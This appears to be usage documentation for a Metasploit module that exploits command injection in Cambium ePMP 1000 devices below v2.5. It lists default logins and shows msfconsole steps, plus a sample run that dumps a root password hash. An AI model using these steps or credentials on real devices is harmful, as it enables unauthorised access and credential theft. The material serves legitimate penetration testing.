This module exploits an OS Command Injection vulnerability in Cambium ePMP 1000 (<v2.5) device management portal.
It requires any one of the following login credentials to dump system hashes:

1. admin/admin
2. installer/installer
3. home/home

## Verification Steps

1. Do: ```use auxiliary/scanner/http/epmp1000_dump_hashes```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/http/epmp1000_dump_hashes
msf auxiliary(epmp1000_dump_hashes) > set rhosts 1.3.3.7
msf auxiliary(epmp1000_dump_hashes) > set rport 80
msf auxiliary(epmp1000_dump_hashes) > run

[+] 1.3.3.7:80 - Running Cambium ePMP 1000 version 2.2...
[*] 1.3.3.7:80 - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "installer":"installer"
[*] ++++++++++++++++++++++++++++++++++++++
[*] 1.3.3.7:80 - [1/1] - dumping password hashes
root:$1$<hash>:0:0:root:/root:/bin/ash
...
...
[*] ++++++++++++++++++++++++++++++++++++++
[+] 1.3.3.7:80 - File retrieved successfully!
[*] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000003_moduletest_1.3.3.7_ePMP_passwd_282393.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
